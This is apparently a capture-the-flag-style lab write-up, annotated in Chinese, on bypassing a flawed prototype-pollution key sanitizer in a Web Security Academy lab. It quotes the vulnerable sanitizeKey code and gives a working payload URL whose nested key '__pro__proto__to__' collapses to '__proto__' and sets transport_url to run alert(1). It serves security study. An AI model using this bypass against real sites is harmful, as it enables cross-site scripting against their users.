---
title: "lab-prototype-pollution-client-side-prototype-pollution-via-flawed-sanitization"
links:
  - target: prototype-pollution-family
    relation: evidences
---

# lab-prototype-pollution-client-side-prototype-pollution-via-flawed-sanitization

> evidences: [[prototype-pollution-family]]

- 题面:Client-side prototype pollution via flawed sanitization(/web-security/prototype-pollution/client-side/lab-prototype-pollution-client-side-prototype-pollution-via-flawed-sanitization)
- 实例:https://0a2900e50319390f824033b0004d0032.web-security-academy.net
- 判定目标:绕过键净化实现污染 + gadget 触发 `alert(1)`;状态:**solved**

## 面

- source:`deparamSanitised.js` + `searchLoggerFiltered.js`,源在 deparam。
- 净化函数(同一脚本):
  ```js
  function sanitizeKey(key){
    let badProperties=['constructor','__proto__','prototype'];
    for(let p of badProperties) key = key.replaceAll(p,'');
    return key;
  }
  ```
  它在赋值时对每层 `key` 调 `sanitizeKey`,但替换是**删子串**而非拒绝:
  `__pro__proto__to__` 删除其中一处 `__proto__` 后塌缩回 `__proto__`。
- gadget:与 lab1 同构 —— `config.transport_url` → `script.src`。

## 载荷

```
https://<inst>/?__pro__proto__to__[transport_url]=data:,alert(1)//
```
键 `__pro__proto__to__` 经 `sanitizeKey` 后 = `__proto__`;`keys[0]` 落 `Object.prototype`,
再写 `transport_url`。

## 证据

```
lab_alert <payload> --settle-ms 2500 -> {"fired":true,"alerts":["alert:1"]}
solved_check <inst> -> {"solved":true,"congrats_line":"<h4>Congratulations, you solved the lab!</h4>"}
```

## 备注

- 净化式防御的通病:全局删除黑名单子串 → 嵌套/重叠写法绕回。`replaceAll` 更甚。
- 同族 lab:`...flawed-sanitization` 与 `...via-browser-apis` 都用 transport_url gadget,区别在防御绕法。
